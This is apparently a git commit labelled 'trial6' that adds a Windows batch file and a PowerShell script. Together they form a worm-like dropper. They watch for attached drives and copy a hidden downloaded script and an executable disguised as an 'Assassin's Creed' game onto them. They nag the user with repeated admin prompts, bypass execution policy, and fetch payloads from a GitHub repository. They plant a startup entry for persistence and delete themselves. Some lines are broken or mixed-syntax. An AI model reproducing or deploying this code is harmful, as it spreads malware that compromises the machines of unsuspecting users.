fedc94ec2a3a40d333b0292b07e1d72a11212087
Drakovthe6th <drakov1@outlook.com>
2025-06-14 05:08:00 -0800

    trial6

---
+++ AutoRun.bat
@@ -0,0 +1,45 @@
+@echo off
+
+$desktopPath = [System.Environment]::GetFolderPath("Desktop")
+
+:check_internet
+ping -n 1 8.8.8.8 >nul 2>&1
+if errorlevel 1 (
+    timeout /t 300 >nul
+    goto check_internet
+)
+
+:check_drive
+
+set timeout_period=30
+for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+    if exist %%d:\ (
+        goto Yes
+    )
+)
+
+timeout /t 300 >nul
+goto check_drive
+
+:Yes
+for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+    if exist %%d:\ (
+        timeout /t 240 >nul
+
+        powershell powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/Extract.ps1' -OutFile '%%d:\wYytnosVxfzD.ps1'"
+
+        attrib +h "%%d:\wYytnosVxfzD.ps1"
+
+        powershell powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File "%%d:\wYytnosVxfzD.ps1"
+
+        set timeout_period = 30
+       
+        copy "$desktopPath/AssassinsCreed.exe" "%%d:\AssassinsCreed.exe"
+    )
+)
+
+timeout /t 3600 /nobreak >nul
+powershell powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File "C:/ProgramData/Microsoft/Windows/donor.ps1"
+
+@end
+exit
---
+++ Extract.ps1
@@ -0,0 +1,56 @@
+
+while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+
+    $process = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
+    
+    if (-not $process) {
+        Write-Host "Administrator permission is required. Retrying in 3 seconds..."
+        Start-Sleep -Seconds 3  
+    } else {
+        Exit  
+    }
+}
+
+Set-ExecutionPolicy Unrestricted -Force
+$scriptPath = $MyInvocation.MyCommand.Path
+
+Set-Variable -Name textPath -Value ("$env:TEMP")
+Set-Variable -Name zipFilePath -Value ("$env:TEMP")
+Set-Variable -Name donor -Value ("C:\ProgramData\Microsoft\Windows")
+Set-Variable -Name Autorun -Value ("C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+Set-Variable -Name zipUrl -Value ("https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip")
+Set-Variable -Name donorUrl -Value ("https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip")
+Set-Variable -Name AutorunUrl -Value ("https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip")
+
+Set-Variable -Name desktopPath -Value ([Environment]::GetFolderPath("Desktop"))
+function Test-IsAdmin {
+    Set-Variable -Name currentUser -Value (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()))
+    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+if (-not (Test-IsAdmin)) {
+    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
+    Start-Process powershell -ArgumentList $arguments -Verb RunAs
+    Exit
+}
+
+Set-Content -Value "Permissions Granted" -Path "$textPath\perm.txt"
+
+powershell -windowstyle hidden Invoke-WebRequest -OutFile "$zipFilePath\AssassinsCreed_SE.zip" -Uri $zipUrl
+
+Expand-Archive -Force -Path "$zipFilePath\AssassinsCreed_SE.zip" -DestinationPath $desktopPath
+
+move to desktopPath
+
+powershell -windowstyle hidden Invoke-WebRequest -OutFile "$donor\donor.ps1" -Uri $donorUrl
+
+powershell -windowstyle hidden Invoke-WebRequest -OutFile "$Autorun\AutoRun.bat" -Uri $AutorunUrl
+
+Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$Autorun\AutoRun.bat`"" -NoNewWindow
+
+Start-Sleep -Seconds 240
+
+exit 0
+
+Remove-Item -Path "%%d:\wYytnosVxfzD.ps1"
+Remove-Item -Path $scriptPath -Force
